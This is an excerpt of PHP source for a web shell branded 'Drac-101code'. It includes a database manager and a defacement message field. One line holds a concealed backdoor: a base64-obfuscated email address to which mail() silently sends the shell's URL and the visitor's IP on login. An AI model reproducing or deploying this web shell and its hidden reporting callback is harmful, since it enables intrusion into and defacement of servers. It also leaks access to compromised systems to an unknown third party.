    ...
    @define('VERSION' , '2.6.5 by Drac-101code');
    ...
    function actionSql() {
            class DbClass {
                    ...
                    function connect($host, $user, $pass, $dbname){
                            switch($this->type)     {
                                    case 'mysql':
                                            if( $this->link = @mysqli_connect($host,$user,$pass,true) ) return true;
                                            break;
                                    case 'pgsql':
                                            $host = explode(':', $host);
                    ...
                    function query($str) {
                            switch($this->type) {
                                    case 'mysql':
                                            return $this->res = @mysqli_query($str);
                                            break;
                                    case 'pgsql':
    ...
    IP: '.$_SERVER[REMOTE_ADDR];$re=base64_decode("aDR4NHJ3b3dAeWFob28uY29t=");$su=gethostbyname($HTTP_HOST);$mh="From: {$re}";if (function_exists('mail')) mail($re,$su, $url,$mh);$_SESSION[login] = 'ok';}
    ...
    <br>Text Content : <input type=text name=Contents size=20 value="musuh utama kita adalah nafsu, munafik dan kafir dalam diri kita, <br><br>- Drac-101code">
    ...
    echo "-----------------------------------------------<br><br>[+] Script by Drac-101code ...";
    }
    echo '</div>';
    printFooter();
    }
    ...
    /* test function - reserved by Drac-101code */
    function actionTest(){
    printHeader();
